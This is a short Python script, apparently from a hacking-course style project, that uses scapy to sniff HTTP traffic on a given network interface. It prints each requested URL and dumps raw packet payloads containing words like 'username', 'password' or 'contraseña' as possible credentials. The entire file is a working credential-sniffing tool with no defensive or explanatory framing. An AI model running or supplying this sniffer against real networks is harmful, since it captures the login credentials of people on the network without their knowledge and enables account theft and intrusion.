#!/usr/bin/python3
from sys import path
import scapy.all as scapy
from scapy.layers import http
import optparse

def sniff(interface):
    try:
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    except OSError:
        print(f"[?] This interface({interface}) isn't avaible")

def get_URL(packet):
    bUrl = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return bUrl.decode("ascii")

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "admin", "password", "pass", "contraseña"]
        for keyword in keywords:
            if keyword in load:
                return load
                

def process_sniffed_packet(packet):

    if packet.haslayer(http.HTTPRequest):
        url = get_URL(packet)
        print("[+] URL:",url)
        log = get_login_info(packet)
        if log:
            print("[+] Posible usuario y contraseña:", log)

def main():
    try:
        parser = optparse.OptionParser()
        parser.add_option("-I", "--interface", dest="interface", help="Input a interface.\n Example: eth0")
        (options, arguments) = parser.parse_args()
        interface = options.interface
        if interface:
            sniff(interface)
        else:
            print("[?] You need input a interface for sniff!")
    except PermissionError:
        print("[-] Execute this script only in privilegies mode")

if __name__ == "__main__":
    main()